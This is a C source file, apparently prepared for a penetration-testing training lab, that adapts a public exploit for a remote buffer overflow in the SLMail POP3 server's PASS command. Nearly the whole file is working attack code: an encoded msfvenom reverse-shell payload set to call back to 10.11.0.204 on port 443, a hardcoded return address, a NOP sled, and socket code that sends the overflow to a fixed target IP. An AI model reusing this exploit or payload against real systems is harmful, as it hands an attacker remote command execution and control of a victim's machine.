/* 643-fixed.c
 *
 * This is a modified version of exploit 643.c from the exploit-db,
 * copyright and credit remains with the original author.
 *
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

/**
 * Add missing libraries
 *
 */
#include <arpa/inet.h>  // Fix implicit declaration ‘inet_addr’
#include <unistd.h>     // Fix implicit declaration ‘read’, 'write', 'close'
 
#define retadd "\x8F\x35\x4A\x5F" /* Win Se7en PWK lab machine */
#define port 110

/**
 * reverse shell
 * 
 * msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.204 LPORT=443 \
 * EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 * 
 */
unsigned char shellcode[] =
"\xbe\xfe\xd8\xbf\x98\xdb\xc1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x73\x0e\x03\x8d\xd6\x5d\x6d\x8d\x0f\x23"
"\x8e\x6d\xd0\x44\x06\x88\xe1\x44\x7c\xd9\x52\x75\xf6\x8f\x5e"
"\xfe\x5a\x3b\xd4\x72\x73\x4c\x5d\x38\xa5\x63\x5e\x11\x95\xe2"
"\xdc\x68\xca\xc4\xdd\xa2\x1f\x05\x19\xde\xd2\x57\xf2\x94\x41"
"\x47\x77\xe0\x59\xec\xcb\xe4\xd9\x11\x9b\x07\xcb\x84\x97\x51"
"\xcb\x27\x7b\xea\x42\x3f\x98\xd7\x1d\xb4\x6a\xa3\x9f\x1c\xa3"
"\x4c\x33\x61\x0b\xbf\x4d\xa6\xac\x20\x38\xde\xce\xdd\x3b\x25"
"\xac\x39\xc9\xbd\x16\xc9\x69\x19\xa6\x1e\xef\xea\xa4\xeb\x7b"
"\xb4\xa8\xea\xa8\xcf\xd5\x67\x4f\x1f\x5c\x33\x74\xbb\x04\xe7"
"\x15\x9a\xe0\x46\x29\xfc\x4a\x36\x8f\x77\x66\x23\xa2\xda\xef"
"\x80\x8f\xe4\xef\x8e\x98\x97\xdd\x11\x33\x3f\x6e\xd9\x9d\xb8"
"\x91\xf0\x5a\x56\x6c\xfb\x9a\x7f\xab\xaf\xca\x17\x1a\xd0\x80"
"\xe7\xa3\x05\x06\xb7\x0b\xf6\xe7\x67\xec\xa6\x8f\x6d\xe3\x99"
"\xb0\x8e\x29\xb2\x5b\x75\xba\xb7\x90\x75\x06\xa0\xa4\x75\x67"
"\x6c\x20\x93\xed\x9c\x64\x0c\x9a\x05\x2d\xc6\x3b\xc9\xfb\xa3"
"\x7c\x41\x08\x54\x32\xa2\x65\x46\xa3\x42\x30\x34\x62\x5c\xee"
"\x50\xe8\xcf\x75\xa0\x67\xec\x21\xf7\x20\xc2\x3b\x9d\xdc\x7d"
"\x92\x83\x1c\x1b\xdd\x07\xfb\xd8\xe0\x86\x8e\x65\xc7\x98\x56"
"\x65\x43\xcc\x06\x30\x1d\xba\xe0\xea\xef\x14\xbb\x41\xa6\xf0"
"\x3a\xaa\x79\x86\x42\xe7\x0f\x66\xf2\x5e\x56\x99\x3b\x37\x5e"
"\xe2\x21\xa7\xa1\x39\xe2\xc7\x43\xeb\x1f\x60\xda\x7e\xa2\xed"
"\xdd\x55\xe1\x0b\x5e\x5f\x9a\xef\x7e\x2a\x9f\xb4\x38\xc7\xed"
"\xa5\xac\xe7\x42\xc5\xe4";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3500);
    memset(buffer, 0x00, 3500);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x00, 16);
    memset(nop, 0x90, 15);
    char *extra = malloc(524);
    memset(extra, 0x00, 524); 
    memset(extra, 0x43, 523);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);
    strcat(buffer, extra);
    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.21.111");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}